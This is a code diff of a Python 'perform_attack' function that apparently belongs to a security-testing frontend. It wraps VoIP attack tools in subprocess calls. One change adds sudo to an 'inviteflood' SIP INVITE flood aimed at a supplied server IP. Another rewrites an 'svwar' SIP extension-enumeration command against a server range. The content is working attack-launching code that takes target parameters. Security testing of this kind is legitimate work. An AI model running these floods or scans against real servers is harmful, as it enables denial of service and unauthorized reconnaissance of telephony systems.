@@ -129,7 +129,7 @@ def perform_attack(attack_id, data):
             raise ValueError("All fields are required for Invite Flood.")
 
         # Command: inviteflood eth0 5000 example.local 192.168.1.5 100
-        command = f"inviteflood {shlex.quote(interface)} 5000 {shlex.quote(username)} {shlex.quote(server_ip)} {shlex.quote(packets)}"
+        command = f"sudo inviteflood {shlex.quote(interface)} 5000 {shlex.quote(username)} {shlex.quote(server_ip)} {shlex.quote(packets)}"
 
         try:
             result = subprocess.run(
@@ -146,14 +146,14 @@ def perform_attack(attack_id, data):
             raise RuntimeError(f"Error executing Invite Flood: {str(e)}")
 
     elif attack_id == "sip_enum":
-        sip_username_range = data.get("sip_username_range")
-        sip_server_ip_range = data.get("sip_server_ip_range")
+        sip_username_range = data.get("sip_username")
+        sip_server_ip_range = data.get("sip_server_ip")
 
         if not all([sip_username_range, sip_server_ip_range]):
             raise ValueError("Both SIP username and server IP range are required for SIP Enumeration.")
 
         # Command: python svwar.py -e<username-range> <server-ip range> -m INVITE
-        command = f"python svwar.py -e{shlex.quote(sip_username_range)} {shlex.quote(sip_server_ip_range)} -m INVITE"
+        command = f"svwar --force -e{shlex.quote(sip_username_range)} -v {shlex.quote(sip_server_ip_range)} -m INVITE"
 
         try:
             result = subprocess.run(
